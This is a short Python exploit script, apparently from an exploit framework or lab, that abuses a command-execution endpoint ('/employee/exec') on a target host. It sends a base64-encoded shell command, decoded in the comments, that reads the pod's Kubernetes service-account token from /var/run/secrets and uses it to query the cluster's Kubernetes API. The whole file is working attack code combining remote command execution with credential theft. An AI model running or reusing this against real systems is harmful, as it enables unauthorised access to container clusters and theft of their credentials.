from BaseExploit import *

import requests

def K8s_API(host, port):
    url=f"http://{host}:{port}/employee/exec"
    # sh -c 'SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount ; curl --cacert ${SERVICEACCOUNT}/ca.crt --header "Authorization: Bearer $(cat ${SERVICEACCOUNT}/token)" -X GET https://$KUBERNETES_SERVICE_HOST/api'
    # SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount ; curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" -X GET https://$KUBERNETES_SERVICE_HOST/api
    res = requests.get(
        url=url,
        headers="",
        cookies="",
        params={"cmd":"c2ggLWMgJ1NFUlZJQ0VBQ0NPVU5UPS92YXIvcnVuL3NlY3JldHMva3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudCA7IGN1cmwgLS1jYWNlcnQgJHtTRVJWSUNFQUNDT1VOVH0vY2EuY3J0IC0taGVhZGVyICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJChjYXQgJHtTRVJWSUNFQUNDT1VOVH0vdG9rZW4pIiAtWCBHRVQgaHR0cHM6Ly8kS1VCRVJORVRFU19TRVJWSUNFX0hPU1QvYXBpJw=="},
    )
    # print(res.text)

Exploit(K8s_API, args.host, args.port)()